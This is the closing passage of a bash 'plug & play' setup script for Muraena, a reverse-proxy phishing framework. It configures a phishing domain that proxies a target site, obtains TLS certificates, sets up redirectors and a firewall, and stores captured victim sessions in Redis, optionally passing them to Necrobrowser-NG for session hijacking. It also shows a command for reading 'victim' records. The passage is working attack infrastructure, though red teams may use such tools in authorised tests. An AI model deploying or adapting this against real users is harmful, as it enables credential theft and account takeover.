    echo ""
    info "Muraena is running!"
    echo ""
    echo -e "  ${BOLD}Phishing domain :${RESET} ${PHISHING_DOMAIN}"
    echo -e "  ${BOLD}Proxying        :${RESET} ${TARGET_DOMAIN}"
    if [[ "$TLS_CHOICE" =~ ^[123]$ ]]; then
        echo -e "  ${BOLD}URL             :${RESET} https://${PHISHING_DOMAIN}"
    else
        echo -e "  ${BOLD}URL             :${RESET} http://${PHISHING_DOMAIN}:8080"
    fi
    case "${SESSION_MODE:-1}" in
        1) echo -e "  ${BOLD}Sessions        :${RESET} Store in Redis only" ;;
        2) echo -e "  ${BOLD}Sessions        :${RESET} Redis + Necrobrowser-NG (Docker)" ;;
        3) echo -e "  ${BOLD}Sessions        :${RESET} Redis + Necrobrowser-NG at ${NECRO_ENDPOINT}" ;;
    esac
    for i in "${!REDIRECTOR_IPS[@]}"; do
        echo -e "  ${BOLD}Redirector $((i+1))     :${RESET} ${REDIRECTOR_IPS[$i]} (${REDIRECTOR_TYPES[$i]}) — config/redirector/redir-$((i+1))/"
    done
    echo ""
    local stop_cmd="docker compose down"
    local logs_cmd="docker compose logs -f muraena"
    [[ "${SESSION_MODE:-1}" == "2" ]] && stop_cmd="docker compose --profile necrobrowser down"
    [[ "${SESSION_MODE:-1}" == "2" ]] && logs_cmd="docker compose --profile necrobrowser logs -f"
    echo -e "  ${BOLD}Inspect Redis   :${RESET} docker compose exec redis redis-cli hgetall victim:<ID>"
    echo -e "  ${BOLD}Logs            :${RESET} ${logs_cmd}"
    echo -e "  ${BOLD}Stop            :${RESET} ${stop_cmd}"
    echo ""
}

# ── main ──────────────────────────────────────────────────────────────────────

main() {
    echo ""
    echo -e "${BOLD}${CYAN}╔══════════════════════════════════════╗${RESET}"
    echo -e "${BOLD}${CYAN}║     Muraena — Plug & Play Setup      ║${RESET}"
    echo -e "${BOLD}${CYAN}╚══════════════════════════════════════╝${RESET}"
    echo ""

    check_root
    check_deps
    gather_config

    section "DNS Check"
    check_dns "$PHISHING_DOMAIN"

    section "Firewall"
    setup_firewall "${REDIRECTOR_IPS[@]+"${REDIRECTOR_IPS[@]}"}"

    section "TLS"
    case "$TLS_CHOICE" in
        1) setup_tls_letsencrypt_http ;;
        2) setup_tls_letsencrypt_dns  ;;
        3) setup_tls_selfsigned       ;;
        *) info "Skipping TLS (HTTP mode)." ;;
    esac

    section "Writing Configuration"
    write_config
    [[ "$SESSION_MODE" =~ ^[23]$ ]] && write_necro_profile
    [[ "$SESSION_MODE" =~ ^[23]$ ]] && write_compose_override
    for i in "${!REDIRECTOR_IPS[@]}"; do
        setup_redirector "${REDIRECTOR_IPS[$i]}" "${REDIRECTOR_TYPES[$i]}" "$((i+1))"
    done

    launch
}

main "$@"
